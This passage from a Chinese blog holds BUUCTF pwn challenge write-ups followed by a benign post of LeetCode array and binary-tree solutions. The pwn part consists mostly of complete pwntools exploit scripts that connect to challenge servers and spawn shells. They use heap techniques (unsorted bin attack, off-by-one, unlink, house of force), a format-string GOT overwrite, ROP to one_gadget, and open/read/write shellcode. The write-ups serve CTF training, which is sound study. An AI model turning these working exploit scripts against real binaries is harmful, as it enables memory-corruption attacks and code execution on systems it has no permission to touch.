want')payload='a'*0x60+p64(bank)+p64(leave)r.send(payload)r.recvuntil('now!')payload=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)r.send(payload)r.recvline()puts_addr=u64(r.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc=LibcSearcher('puts',puts_addr)libc_base=puts_addr-libc.dump('puts')one_gadget=libc_base+0x4526a#system=libc_base+libc.dump('system')#binsh=libc_base+libc.dump('str_bin_sh')#payload='a'*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)payload='a'*(0x60+8)+p64(one_gadget)r.send(payload)r.interactive() # hitcontraining_magicheap（unsorted bin attack) Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。 Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。 Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。 初始状态时 unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。 执行 free 由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。 修改 p [1] 经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。 所以核心在于通过修改使堆块的 fd 指针指向利用的地址 - 16 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#p = process('./magicheap')p=remote('node4.buuoj.cn',26349)def CreateHeap(size,content): p.recvuntil(':') p.sendline('1') p.recvuntil(':') p.sendline(str(size)) p.recvuntil(':') p.sendline(content) def EditHeap(idx,size,content): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(idx)) p.recvuntil(':') p.sendline(str(size)) p.recvuntil(':') p.sendline(content) def DeleteHeap(idx): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(idx))CreateHeap(0x30,'aaaa')CreateHeap(0x80,'bbbb')CreateHeap(0x10,'cccc')DeleteHeap(1)#gdb.attach(p)magic = 0x6020A0EditHeap(0,0x50,0x30 * &quot;a&quot; + p64(0)+p64(0x91)+p64(0)+p64(magic-0x10))# 修改heap1的fd和bk指针#gdb.attach(p)CreateHeap(0x80,'dddd') #触发#gdb.attach(p)p.sendlineafter(':','4869')p.interactive() # roarctf_2019_easy_pwn（off-by-one) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *r=remote('node4.buuoj.cn',26307)# r=process('roarctf_2019_easy_pwn')libc=ELF('./libc-2.23.so')context.log_level=&quot;debug&quot;def add(size): r.recvuntil('choice: ') r.sendline('1') r.recvuntil('size:') r.sendline(str(size))def edit(index,size,data): r.recvuntil('choice: ') r.sendline('2') r.recvuntil('index:') r.sendline(str(index)) r.recvuntil('size:') r.sendline(str(size)) r.recvuntil('content:') r.send(data) def delete(index): r.recvuntil('choice: ') r.sendline('3') r.recvuntil('index:') r.sendline(str(index)) def show(index): r.recvuntil('choice: ') r.sendline('4') r.recvuntil('index:') r.sendline(str(index)) malloc_hook=libc.symbols['__malloc_hook']realloc_hook=libc.symbols['realloc']print hex(malloc_hook)print hex(realloc_hook)#gdb.attach(r,&quot;b calloc&quot;)add(0x18)#idx0add(0x10)#idx1add(0x90)#idx2add(0x10)#idx3#gdb.attach(r)edit(0,34,'a'*0x10+p64(0x20)+p8(0xa1))#off by one #gdb.attach(r)edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))#by pass check #gdb.attach(r)delete(1)add(0x90)#idx1 chunk overlapedit(1,0x20,p64(0)*2+p64(0)+p64(0xa1))delete(2) show(1)r.recvuntil(&quot;content: &quot;)r.recv(0x20)libc_base=u64(r.recv(6).ljust(8,&quot;\\x00&quot;))-0x3c4b78print &quot;libc_base:&quot;+hex(libc_base)add(0x80)edit(1,0x90,p64(0)*2+p64(0)+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21))delete(2)edit(1,0x30,p64(0)*2+p64(0)+p64(0x71)+p64(malloc_hook+libc_base-0x23)*2)add(0x60)add(0x60)#idx4#gdb.attach(r)one_gadgets=[0x45216,0x4526a,0xf1147,0xf02a4]edit(4,27,'a'*11+p64(libc_base+one_gadgets[2])+p64(libc_base+realloc_hook+4)) add(0x60)r.interactive() # hitcontraining_heapcreator(off-by-one) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *from LibcSearcher import LibcSearchersh=remote(&quot;node4.buuoj.cn&quot;,25982)# sh = process('./heapcreator')elf=ELF('./heapcreator')def create(length,value): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size of Heap : &quot;) sh.sendline(str(int(length))) sh.recvuntil(&quot;Content of heap:&quot;) sh.sendline(value)def edit(index,value): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(str(int(index))) sh.recvuntil(&quot;Content of heap : &quot;) sh.sendline(value)def show(index): sh.recvuntil(&quot;Your choice :&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index :&quot;) sh.sendline(str(int(index)))def delete(index): sh.recvuntil('Your choice :') sh.sendline('4') sh.recvuntil('Index :') sh.sendline(str(int(index)))create(0x18,'aaaa')create(0x10,'bbbb')create(0x10,'cccc')create(0x10,'/bin/sh')edit(0,'a'*0x18+'\\x81')delete(1)size = '\\x08'.ljust(8,'\\x00')payload = 'd'*0x40+ size + p64(elf.got['free'])create(0x70,payload)show(2)sh.recvuntil('Content : ')free_addr = u64(sh.recvuntil('Done')[:-5].ljust(8,'\\x00'))libc=LibcSearcher(&quot;free&quot;,free_addr)system_addr=free_addr+libc.dump(&quot;system&quot;)-libc.dump(&quot;free&quot;)edit(2,p64(system_addr))delete(3)sh.interactive() https://blog.csdn.net/weixin_45677731/article/details/107914807 # hitcon2014_stkof(unlink) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *# sh=remote(&quot;node4.buuoj.cn&quot;,28995)sh=process(&quot;./stkof&quot;)context.log_level='debug'elf=ELF('./stkof')libc=ELF('./libc-2.23.so')puts_plt=elf.plt['puts']puts_got=elf.got['puts']free=elf.got['free']ptr=0x602150def alloc(size): sh.sendline('1') sh.sendline(str(size)) sh.recvuntil('OK\\n')def edit(idx, size, content): sh.sendline('2') sh.sendline(str(idx)) sh.sendline(str(size)) sh.send(content) sh.recvuntil('OK\\n')def delete(idx): sh.sendline('3') sh.sendline(str(idx)) alloc(0x100)alloc(0x20)alloc(0x80)payload=p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)payload+=p64(0x20)+p64(0x90)edit(2,len(payload),payload)delete(3)sh.recvuntil('OK')payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(puts_got)edit(2,len(payload),payload)edit(1,8,p64(puts_plt))delete(3)base = u64(sh.recv(6).ljust(8,'\\x00'))-libc.symbols['puts']sh.recvuntil('OK')system_addr=base+libc.symbols['system']payload=p64(0)+p64(0)+p64(free)+p64(ptr-0x18)+p64(ptr+0x10)+&quot;/bin/sh&quot;edit(2,len(payload),payload)edit(1,8,p64(system_addr))delete(3)sh.interactive() # zctf2016_note2(unlink) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#coding=utf-8from pwn import *io = remote('node4.buuoj.cn',26179)# io = process(&quot;./note2&quot;)elf = ELF(&quot;./note2&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)#context.log_level = &quot;debug&quot;def new_note(size, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;)&quot;) io.sendline(str(size)) io.recvuntil(&quot;:&quot;) io.sendline(content)def show_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))def edit_note(index, choice, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index)) io.recvuntil(&quot;]&quot;) io.sendline(str(choice)) io.recvuntil(&quot;:&quot;) io.sendline(content)def delete_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))io.recvuntil(&quot;:&quot;)io.sendline(&quot;/bin/sh&quot;) #nameio.recvuntil(&quot;:&quot;)io.sendline(&quot;ddd&quot;)ptr_0 = 0x602120fake_fd = ptr_0 - 0x18fake_bk = ptr_0 - 0x10note0_content = &quot;\\x00&quot; * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)new_note(0x80, note0_content) #note0new_note(0x0, &quot;aa&quot;) #note1new_note(0x80, &quot;/bin/sh&quot;) #note2#gdb.attach(io)delete_note(1)note1_content = &quot;\\x00&quot; * 16 + p64(0xa0) + p64(0x90)new_note(0x0, note1_content)delete_note(2) #unlink#gdb.attach(io)# 泄漏libcfree_got = elf.got[&quot;free&quot;]payload = 0x18 * &quot;a&quot; + p64(free_got)#gdb.attach(io)edit_note(0, 1, payload)#gdb.attach(io)show_note(0)io.recvuntil(&quot;is &quot;)free_addr = u64(io.recv(6).ljust(8, &quot;\\x00&quot;))libc_addr = free_addr - libc.symbols[&quot;free&quot;]print(&quot;libc address: &quot; + hex(libc_addr))#get shellsystem_addr = libc_addr + libc.symbols[&quot;system&quot;]one_gadget = libc_addr + 0xf02a4edit_note(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address#io.sendlineafter('option---&gt;&gt;','/bin/sh\\x00')io.interactive() # wdb_2018_1st_babyheap(unlink,uaf) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 26136)#r = process(&quot;./wdb_2018_1st_babyheap&quot;)context(log_level = 'debug', arch = 'amd64', os = 'linux')DEBUG = 0if DEBUG: gdb.attach(r, ''' b *0x400CF7 x/10gx 0x602060 c ''')elf = ELF(&quot;./wdb_2018_1st_babyheap&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]bss_arr = 0x602060read_got = elf.got['read']menu = &quot;Choice:&quot;def add(index, content): r.recvuntil(menu) r.sendline('1') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index)) r.recvuntil(&quot;Content:&quot;) r.send(content)def delete(index): r.recvuntil(menu) r.sendline('4') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index))def edit(index, content): r.recvuntil(menu) r.sendline('2') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index)) r.recvuntil(&quot;Content:&quot;) r.send(content)def show(index): r.recvuntil(menu) r.sendline('3') r.recvuntil(&quot;Index:&quot;) r.sendline(str(index))sleep(3)add(0, (p64(0)+p64(0x31))*2)add(1, 'aaa\\n')add(2, 'aaa\\n')add(3, 'aaa\\n')add(4, '/bin/sh\\n')delete(0)delete(1)delete(0)show(0)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00')) - 0x30success(&quot;heap:&quot;+hex(heap))edit(0, p64(heap+0x10)+'\\n')add(5, p64(0) + p64(0x31) + p64(heap) + p64(bss_arr-0x10))payload = p64(bss_arr-0x18) + p64(bss_arr-0x10) + p64(0x20) + p64(0x90)add(6, payload)add(7, p64(0) + p64(0x21) + p64(bss_arr-0x18) + p64(bss_arr-0x10))delete(1)show(6)malloc_hook = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10libc.address = malloc_hook - libc.sym['__malloc_hook']success(&quot;libc;&quot;+hex(libc.address))system = libc.symbols['system']free_hook = libc.sym['__free_hook']edit(0, p64(0)*3+p64(free_hook))edit(0, p64(system)+'\\n')delete(4)r.interactive() # axb_2019_fmt64（64 位格式化字符串改 got 表） 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context.log_level = 'debug'# io = remote('node4.buuoj.cn',29964)io = process('axb_2019_fmt64')elf = ELF('./axb_2019_fmt64')#libc = elf.libclibc = ELF('./libc-2.23.so')one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]sprintf_got = elf.got['sprintf']payload = '%9$saaaa'payload += p64(sprintf_got)io.recvuntil(&quot;Please tell me:&quot;)io.sendline(payload)sprintf_addr = u64(io.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))print &quot;sprintf_addr:&quot;+hex(sprintf_addr)libcbase = sprintf_addr - libc.symbols['sprintf']one_gadget = libcbase + one_gadget[0]print &quot;one_gadget:&quot;+hex(one_gadget)payload = ''payload += '%' + str((one_gadget % 0x10000) - 9) + 'c%12$hn'payload += '%' + str(((one_gadget &gt;&gt; 16) % 0x10000) - (one_gadget % 0x10000)) + 'c%13$hn'payload = payload.ljust(0x20,'\\x00')payload += p64(sprintf_got) + p64(sprintf_got + 2)print 'payload:'+payloadio.sendline(payload)io.interactive() # pwnable_asm（沙箱) # sandbox 概述 沙盒机制也就是我们常说的沙箱，英文名 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。 在 ctf 比赛中，pwn 题中的沙盒一般都会限制 execve 的系统调用，这样一来 one_gadget 和 system 调用都不好使，只能采取 open/read/write 的组合方式来读取 flag。 一般有两种函数调用方式实现沙盒机制，第一种是采用 prctl 函数调用，第二种是使用 seccomp 库函数。 使用 seccomp-tools 检查沙盒机制，可以看到先是判断了体系架构是否是 x86_64 的，然后对系统调用号进行了判断，只允许了 read/write/open/exit 四种系统调用。 # EXP 12345678910111213141516171819#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = &quot;debug&quot;context.arch = 'amd64'context.os = 'linux'sh = remote(&quot;node4.buuoj.cn&quot;,&quot;26693&quot;)# sh = process('./asm')shellcode = shellcraft.pushstr(&quot;flag&quot;)shellcode += shellcraft.open(&quot;rsp&quot;)shellcode += shellcraft.read('rax', 'rsp', 100)shellcode += shellcraft.write(1, 'rsp', 100)sh.sendlineafter(&quot;shellcode: &quot;, asm(shellcode))print sh.recvall()sh.close() 参考文章：https://blog.csdn.net/A951860555/article/details/116738676 # bctf2016_bcloud(house of force) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#coding:utf8from pwn import *from LibcSearcher import * #house of forcesh = process('./bcloud')# sh = remote('node4.buuoj.cn',28752)elf = ELF('./bcloud')puts_plt = elf.plt['puts']puts_got = elf.got['puts']free_got = elf.got['free']heap_array_addr = 0x0804B120sh.sendafter('Input your name:','a'*0x40)sh.recvuntil('a'*0x40)heap_addr = u32(sh.recv(4))print 'heap_addr=',hex(heap_addr)sh.sendafter('Org:','a'*0x40)#修改top chunk的sizesh.sendlineafter('Host:',p32(0xFFFFFFFF))top_chunk_addr = heap_addr + 0xD0print 'top_chunk_addr=',hex(top_chunk_addr) def add(size,content): sh.sendlineafter('option---&gt;&gt;','1') sh.sendlineafter('Input the length of the note content:',str(size)) sh.sendafter('Input the content:',content) def edit(index,content): sh.sendlineafter('option---&gt;&gt;','3') sh.sendlineafter('Input the id:',str(index)) sh.sendafter('Input the new content:',content) def delete(index): sh.sendlineafter('option---&gt;&gt;','4') sh.sendlineafter('Input the id:',str(index))offset = heap_array_addr - top_chunk_addr - 0x10add(offset,'') #0#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了add(0x18,'\\n') #1 #修改heap_arrayedit(1,p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + '/bin/sh\\x00')#修改free的got表为puts的plt表edit(1,p32(puts_plt) + '\\n')#泄露puts的地址delete(2)sh.recv(1)puts_addr = u32(sh.recv(4))libc = LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')system_addr = libc_base + libc.dump('system')print 'libc_base=',hex(libc_base)print 'system_addr=',hex(system_addr)#修改free的got表为system地址edit(1,p32(system_addr) + '\\n')#getshelldelete(3) sh.interactive() 参考文章 https://snappyjack.github.io/articles/2019-12/BCTF2016_bcloud https://blog.csdn.net/csdn546229768/article/details/122725993","link":"/2022/02/18/BUUCTF%20Pwn%20Exercise/"},{"title":"leetcode数据结构刷题(一)","text":"Leetcode 数据结构练习 # 数组 # 最大子序和 思路：动态规划 12345678910class Solution { public int maxSubArray(int[] nums) { int pre = 0,maxn = nums[0]; for (int x:nums){ pre = Math.max(pre+x,x); maxn = Math.max(pre,maxn); } return maxn; }} # 两数之和 哈希表降时间复杂度从 o (n) 到 o (1) 创建一个哈希表，对于每一个 x ，我们首先查询哈希表中是否存在 target - x ，然后将 x 插入到哈希表中，即可保证不会让 x 和自己匹配。 123456789101112class Solution { public int[] twoSum(int[] nums, int target) { Map&lt;Integer, Integer&gt; hashtable = new HashMap&lt;Integer, Integer&gt;(); for (int i = 0; i &lt; nums.length; ++i) { if (hashtable.containsKey(target - nums[i])) { return new int[]{hashtable.get(target - nums[i]), i}; } hashtable.put(nums[i], i); } return new int[0]; }} # 合并两个有序数组 给你两个按 非递减顺序 排列的整数数组 nums1 和 nums2，另有两个整数 m 和 n ，分别表示 nums1 和 nums2 中的元素数目。 请你 合并 nums2 到 nums1 中，使合并后的数组同样按 非递减顺序 排列。 注意：最终，合并后数组不应由函数返回，而是存储在数组 nums1 中。为了应对这种情况，nums1 的初始长度为 m + n，其中前 m 个元素表示应合并的元素，后 n 个元素为 0 ，应忽略。nums2 的长度为 n 。 示例 1： 输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3 输出：[1,2,2,3,5,6] 解释：需要合并 [1,2,3] 和 [2,5,6] 。 合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。 示例 2： 输入：nums1 = [1], m = 1, nums2 = [], n = 0 输出：[1] 解释：需要合并 [1] 和 [] 。 合并结果是 [1] 。 示例 3： 输入：nums1 = [0], m = 0, nums2 = [1], n = 1 输出：[1] 解释：需要合并的数组是 [] 和 [1] 。 合并结果是 [1] 。 注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。 exp 一、双指针 123456789101112131415161718192021222324class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { int p1 = 0, p2 = 0; int sorted[m + n]; int cur; while (p1 &lt; m || p2 &lt; n) { if (p1 == m) { cur = nums2[p2++]; } else if (p2 == n) { cur = nums1[p1++]; } else if (nums1[p1] &lt; nums2[p2]) { cur = nums1[p1++]; } else { cur = nums2[p2++]; } sorted[p1 + p2 - 1] = cur; } for (int i = 0; i != m + n; ++i) { nums1[i] = sorted[i]; } }}; 复杂度分析 时间复杂度：O (m+n) 指针移动单调递增，最多移动 m+n 次，因此时间复杂度为 O (m+n)。 空间复杂度：O (m+n)。 需要建立长度为 m+n 的中间数组 sorted。 二、逆向双指针 从后向前遍历，将两者较大的元素放在 nums 数组的后面而不会被覆盖，降低了空间复杂度为 O (1) 1234567891011121314151617181920class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { int p1 = m - 1, p2 = n - 1; int tail = m + n - 1; int cur; while (p1 &gt;= 0 || p2 &gt;= 0) { if (p1 == -1) { cur = nums2[p2--]; } else if (p2 == -1) { cur = nums1[p1--]; } else if (nums1[p1] &gt; nums2[p2]) { cur = nums1[p1--]; } else { cur = nums2[p2--]; } nums1[tail--] = cur; } }}; # 两个数组的交集 一、哈希表 1234567891011121314151617181920212223class Solution {public: vector&lt;int&gt; intersect(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { if (nums1.size() &gt; nums2.size()) { return intersect(nums2, nums1); } unordered_map &lt;int, int&gt; m; for (int num : nums1) { ++m[num]; } vector&lt;int&gt; intersection; for (int num : nums2) { if (m.count(num)) { intersection.push_back(num); --m[num]; if (m[num] == 0) { m.erase(num); } } } return intersection; }}; 时间复杂度：O (m+n), 空间复杂度：O (min (m,n)) 二、双指针排序 12345678910111213141516171819202122232425262728```### 买卖股票的最佳时机&gt;输入：[7,1,5,3,6,4]&gt;输出：5&gt;解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。&gt; 注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。exp:**动态规划**(来自题解）考虑每次如何获取最大收益，第i天的最大收益通过前i天的最低点就可以算出来。而第i天以前（包括第i天）的最低点和i-1天的最低点有关，因此动态方程为dp[i] = min(d[i-1],prices[i])其中dp[0]=prices[0],然后动态计算之后的就可以了。 得到了前i天的最低点以后，只需要维护一个max用来保存最大收益就可以了。 时间复杂度为O(n),一次遍历，空间复杂度O（n）的动态规划，代码如下：```java //dp[i]表示截止到i，价格的最低点是多少 dp[i]=min(dp[i-1],nums[i]) int max = 0; int[] dp = new int[prices.length]; dp[0] = prices[0]; for (int i = 1; i &lt; prices.length; i++) { dp[i] = (dp[i - 1] &lt; prices[i]) ? dp[i - 1] : prices[i]; max = (prices[i] - dp[i]) &gt; max ? prices[i] - dp[i] : max; } return max; 接着考虑优化空间，仔细观察动态规划的辅助数组，其实每一次只用到了 dp [-1] 这一个空间，因此可以把数组改成单个变量 dp 来存储截止到第 i 天的价格最低点。优化之后的代码就是题解中的方法二。 12345678910111213class Solution {public: int maxProfit(vector&lt;int&gt;&amp; prices) { int inf = 1e9; int minprice = inf, maxprofit = 0; for (int price: prices) { maxprofit = max(maxprofit, price - minprice); minprice = min(price, minprice); } return maxprofit; }}; 时间复杂度 O (n), 空间复杂度 O (1) # 树和二叉树 # 二叉树的深度 输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。 例如： 给定二叉树 [3,9,20,null,null,15,7]， ​ 3 / 9 20 / 15 7 返回它的最大深度 3 。 # 法一：DFS 树的深度等于左子树的深度和右子树深度的最大值 + 1 12345678910111213141516171819/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: int maxDepth(TreeNode* root) { if(root==nullptr) return 0; int leftdeep=maxDepth(root-&gt;left); int rightdeep = maxDepth(root-&gt;right); return max(leftdeep,rightdeep)+1; }}; # 对称二叉树 请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。 例如，二叉树 [1,2,2,3,4,4,3] 是对称的。 1 / 2 2 / \\ / 3 4 4 3 但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的: 1 / 2 2 \\ 3 3 题解： 双指针递归剪枝，结束条件为左右指针同时都为空指针返回 true，如果值不同或只有一个为空返回 false 12345678910111213141516171819202122232425262728/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: bool isSymmetric(TreeNode* root) { if(root==NULL) return true; TreeNode *l=root; TreeNode *r=root; return recv(l,r); } bool recv(TreeNode * l,TreeNode *r){ if(l==NULL&amp;&amp;r==NULL) return true; if(l==NULL||r==NULL||l-&gt;val!=r-&gt;val) return false; //上面两个位置不能调换 return recv(l-&gt;left,r-&gt;right)&amp;&amp;recv(l-&gt;right,r-&gt;left); }}; # 平衡二叉树 平衡二叉树的定义是：二叉树的每个节点的左右子树的高度差的绝对值不超过 11，则二叉树是平衡二叉树。根据定义，一棵二叉树是平衡二叉树，当且仅当其所有子树也都是平衡二叉树，因此可以使用递归的方式判断二叉树是不是平衡二叉树，递归的顺序可以是自顶向下或者自底向上。 # 法一： 自顶向下递归 123456789101112131415161718class Solution {public: int height(TreeNode* root) { if (root == NULL) { return 0; } else { return max(height(root-&gt;left), height(root-&gt;right)) + 1; } } bool isBalanced(TreeNode* root) { if (root == NULL) { return true; } else { return abs(height(root-&gt;left) - height(root-&gt;right)) &lt;= 1 &amp;&amp; isBalanced(root-&gt;left) &amp;&amp; isBalanced(root-&gt;right); } }}; 复杂度分析 时间复杂度：O (n^2)，其中 n 是二叉树中的节点个数。 最坏情况下，二叉树是满二叉树，需要遍历二叉树中的所有节点，时间复杂度是 O (n)。 对于节点 p，如果它的高度是 d，则 \\texttt {height}§height§ 最多会被调用 dd 次（即遍历到它的每一个祖先节点时）。对于平均的情况，一棵树的高度 h 满足 O (h)=O (\\log n) O (h)=O (logn)，因为 d \\leq hd≤h，所以总时间复杂度为 O (n \\log n)。对于最坏的情况，二叉树形成链式结构，高度为 O (n)，此时总时间复杂度为 O (n^2) 空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。 # 法二： 自底向上递归 1234567891011121314151617181920class Solution {public: int height(TreeNode* root) { if (root == NULL) { return 0; } int leftHeight = height(root-&gt;left); int rightHeight = height(root-&gt;right); if (leftHeight == -1 || rightHeight == -1 || abs(leftHeight - rightHeight) &gt; 1) { return -1; } else { return max(leftHeight, rightHeight) + 1; } } bool isBalanced(TreeNode* root) { return height(root) &gt;= 0; }}; 复杂度分析 时间复杂度：O (n)，其中 n 是二叉树中的节点个数。使用自底向上的递归，每个节点的计算高度和判断是否平衡都只需要处理一次，最坏情况下需要遍历二叉树中的所有节点，因此时间复杂度是 O (n)。 空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。 # 二叉树剪枝 后序遍历 dfs 12345678910111213141516171819202122232425/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class Solution {public: TreeNode* pruneTree(TreeNode* root) { if(root == NULL) return NULL; TreeNode *leftnode = pruneTree(root-&gt;left); TreeNode *rightnode = pruneTree(root-&gt;right); if(root-&gt;val==0 &amp;&amp; leftnode==NULL&amp;&amp;rightnode == NULL ) return nullptr; root-&gt;left = leftnode; root-&gt;right= rightnode; return root; } }; # 寻找最近公共祖先 # 法一：递归 12345678910111213141516171819class Solution {public: TreeNode* ans; bool dfs(TreeNode* root, TreeNode* p, TreeNode* q) { if (root == nullptr) return false; bool lson = dfs(root-&gt;left, p, q); bool rson = dfs(root-&gt;right, p, q); if ((lson &amp;&amp; rson) || ((root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val) &amp;&amp; (lson || rson)))//lson&amp;&amp;rson表示左右子树均包含p或q节点，root恰好是p或q且它的左子树或右子树有一个包含了另一个节点的情况 { ans = root; } return lson || rson || (root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val); } TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { dfs(root, p, q); return ans; }}; # 法二：存储父节点 从根节点开始遍历整棵二叉树，用哈希表记录每个节点的父节点指针。 从 p 节点开始不断往它的祖先移动，并用数据结构记录已经访问过的祖先节点。 同样，我们再从 q 节点开始不断往它的祖先移动，如果有祖先已经被访问过，即意味着这是 p 和 q 的深度最深的公共祖先，即 LCA 节点。 1234567891011121314151617181920212223242526272829class Solution {public: unordered_map&lt;int, TreeNode*&gt; fa; unordered_map&lt;int, bool&gt; vis; void dfs(TreeNode* root){ if (root-&gt;left != nullptr) { fa[root-&gt;left-&gt;val] = root; dfs(root-&gt;left); } if (root-&gt;right != nullptr) { fa[root-&gt;right-&gt;val] = root; dfs(root-&gt;right); } } TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { fa[root-&gt;val] = nullptr; dfs(root); while (p != nullptr) { vis[p-&gt;val] = true; p = fa[p-&gt;val]; } while (q != nullptr) { if (vis[q-&gt;val]) return q; q = fa[q-&gt;val]; } return nullptr; }}; # 二叉搜索树 输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。 为了让您更好地理解问题，以下面的二叉搜索树为例： 我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。 下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。 特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。 思路： 二叉搜索树 转换成一个 “排序的循环双向链表” ，其中包含三个要素： 排序链表： 节点应从小到大排序，因此应使用 中序遍历 “从小到大” 访问树的节点。 双向链表： 在构建相邻节点的引用关系时，设前驱节点 pre 和当前节点 cur ，不仅应构建 pre.right = cur ，也应构建 cur.left = pre 。 循环链表： 设链表头节点 head 和尾节点 tail ，则应构建 head.left = tail 和 tail.right = head 。 算法流程 dfs (cur): 递归法中序遍历； 终止条件： 当节点 cur 为空，代表越过叶节点，直接返回； 递归左子树，即 dfs (cur.left) ； 构建链表： 当 pre 为空时： 代表正在访问链表头节点，记为 head ； 当 pre 不为空时： 修改双向节点引用，即 pre.right = cur ， cur.left = pre ； 保存 cur ： 更新 pre = cur ，即节点 cur 是后继节点的 pre ； 递归右子树，即 dfs (cur.right) ； treeToDoublyList(root)： 特例处理： 若节点 root 